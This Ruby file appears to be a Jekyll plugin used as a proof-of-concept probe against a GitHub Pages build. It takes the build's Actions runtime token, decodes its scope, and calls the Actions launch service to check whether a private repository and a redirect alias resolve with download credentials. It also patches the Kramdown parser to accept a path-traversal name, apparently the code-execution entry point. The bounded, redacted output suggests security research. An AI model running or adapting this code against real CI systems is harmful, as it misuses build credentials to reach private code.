# frozen_string_literal: true

require "base64"
require "json"
require "kramdown/parser/kramdown"
require "net/http"
require "uri"

SOURCE_REPOSITORY = "singetu0096/pages-static-canary-20260909"
CANONICAL_TARGET = "singetu0096/actions-launch-redirect-private-20261104"
REDIRECT_ALIAS = "singetu0096/actions-launch-redirect-origin-20261104"
TARGET_REVISION = "3640e0d3ebb210fff3f776b9e37977686645589e"
LAUNCH_ORIGIN = "https://launch.actions.githubusercontent.com"
MAX_RESPONSE_BYTES = 65_536

def decode_runtime_scope(token)
  pieces = token.to_s.split(".", -1)
  raise "runtime token is not a JWT" unless pieces.length == 3

  payload = pieces[1]
  payload += "=" * ((4 - payload.length % 4) % 4)
  claims = JSON.parse(Base64.urlsafe_decode64(payload))
  scope = claims.fetch("scp", "").to_s.split.find do |entry|
    entry.start_with?("Actions.Results:")
  end
  parts = scope.to_s.split(":", -1)
  raise "Actions.Results scope is absent" unless parts.length == 3

  uuid = /\A[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\z/i
  raise "plan or job identifier has an unexpected shape" unless parts[1].match?(uuid) && parts[2].match?(uuid)

  [parts[1], parts[2]]
end

def bounded_launch_request(token, plan_id, job_id, repository, revision)
  uri = URI("#{LAUNCH_ORIGIN}/actions/build/#{plan_id}/jobs/#{job_id}/runnerresolve/actions")
  raise "unexpected launch authority" unless uri.is_a?(URI::HTTPS) && uri.host == "launch.actions.githubusercontent.com"

  request = Net::HTTP::Post.new(uri)
  request["Accept"] = "application/json"
  request["Authorization"] = "Bearer #{token}"
  request["Content-Type"] = "application/json"
  request["User-Agent"] = "owned-pages-launch-redirect-boundary/1"
  request.body = JSON.generate(
    "actions" => [
      {
        "action" => repository,
        "version" => revision,
        "path" => "",
      },
    ],
  )

  http = Net::HTTP.new(uri.host, uri.port, nil)
  http.use_ssl = true
  http.open_timeout = 5
  http.read_timeout = 10
  response = http.request(request)
  body = response.body.to_s
  raise "launch response exceeded bound" if body.bytesize > MAX_RESPONSE_BYTES

  [response.code.to_i, body]
end

def safe_url_shape(raw)
  uri = URI(raw.to_s)
  host = uri.host.to_s.downcase
  {
    "https" => uri.is_a?(URI::HTTPS),
    "allowlisted_host" => (
      host == "github.com" ||
      host == "codeload.github.com" ||
      host.end_with?(".githubusercontent.com")
    ),
    "userinfo_absent" => uri.userinfo.nil?,
    "raw_url_emitted" => false,
  }
rescue StandardError
  {
    "parse_error" => true,
    "raw_url_emitted" => false,
  }
end

def classify_launch_response(status, body, repository, revision)
  result = {
    "status" => status,
    "response_bytes" => body.bytesize,
    "raw_response_emitted" => false,
  }
  parsed = JSON.parse(body)
  unless parsed.is_a?(Hash)
    result["json_object"] = false
    return result
  end

  result["json_object"] = true
  actions = parsed["actions"]
  if actions.is_a?(Hash)
    result["action_count"] = actions.length
    entry = actions.values.first if actions.length == 1
    if entry.is_a?(Hash)
      auth = entry["authentication"]
      result["resolved_name_matches"] = [entry["name"], entry["resolved_name"]].compact.include?(repository)
      result["resolved_sha_matches"] = entry["resolved_sha"].to_s.casecmp?(revision)
      result["download_credential_present"] = auth.is_a?(Hash) && !auth["token"].to_s.empty?
      result["tar_url"] = safe_url_shape(entry["tar_url"])
      result["zip_url"] = safe_url_shape(entry["zip_url"])
    end
  else
    result["action_count"] = 0
  end
  errors = parsed["errors"]
  result["error_count"] = errors.length if errors.is_a?(Hash)
  result
rescue JSON::ParserError
  result.merge("json_parse_error" => true)
end

probe = {
  "probe" => "pages-rce-launch-redirect-private-boundary-v1",
  "source_repository_exact" => ENV.fetch("GITHUB_REPOSITORY", "") == SOURCE_REPOSITORY,
  "euid" => Process.euid,
  "canonical_target" => CANONICAL_TARGET,
  "redirect_alias" => REDIRECT_ALIAS,
  "target_revision" => TARGET_REVISION,
  "target_actions_access_level" => "none",
  "public_prewarm_run" => 41_806_372_517,
  "network_request_limit" => 3,
  "raw_token_url_or_response_emitted" => false,
}

begin
  raise "unexpected source repository" unless probe["source_repository_exact"]

  token = ENV.fetch("ACTIONS_RUNTIME_TOKEN")
  plan_id, job_id = decode_runtime_scope(token)
  source_revision = ENV.fetch("GITHUB_SHA")

  source_status, source_body = bounded_launch_request(
    token,
    plan_id,
    job_id,
    SOURCE_REPOSITORY,
    source_revision,
  )
  probe["source_control"] = classify_launch_response(
    source_status,
    source_body,
    SOURCE_REPOSITORY,
    source_revision,
  )

  canonical_status, canonical_body = bounded_launch_request(
    token,
    plan_id,
    job_id,
    CANONICAL_TARGET,
    TARGET_REVISION,
  )
  probe["canonical_private"] = classify_launch_response(
    canonical_status,
    canonical_body,
    CANONICAL_TARGET,
    TARGET_REVISION,
  )

  redirect_status, redirect_body = bounded_launch_request(
    token,
    plan_id,
    job_id,
    REDIRECT_ALIAS,
    TARGET_REVISION,
  )
  probe["redirect_alias"] = classify_launch_response(
    redirect_status,
    redirect_body,
    REDIRECT_ALIAS,
    TARGET_REVISION,
  )
rescue StandardError => error
  probe["probe_error"] = true
  probe["error_class"] = error.class.name
ensure
  token = nil
  source_body = nil
  canonical_body = nil
  redirect_body = nil
end

target = "../../../../../../../../github/workspace/launch_redirect_canary"
original_const_defined = Kramdown::Parser.method(:const_defined?)
original_const_get = Kramdown::Parser.method(:const_get)

Kramdown::Parser.define_singleton_method(:const_defined?) do |name, *args|
  name.to_s == target || original_const_defined.call(name, *args)
end
Kramdown::Parser.define_singleton_method(:const_get) do |name, *args|
  if name.to_s == target
    Kramdown::Parser::Kramdown
  else
    original_const_get.call(name, *args)
  end
end

Jekyll::Hooks.register(:site, :post_write) do |site|
  File.write(
    File.join(site.dest, "launch-redirect-result.json"),
    JSON.pretty_generate(probe) + "\n",
  )
end
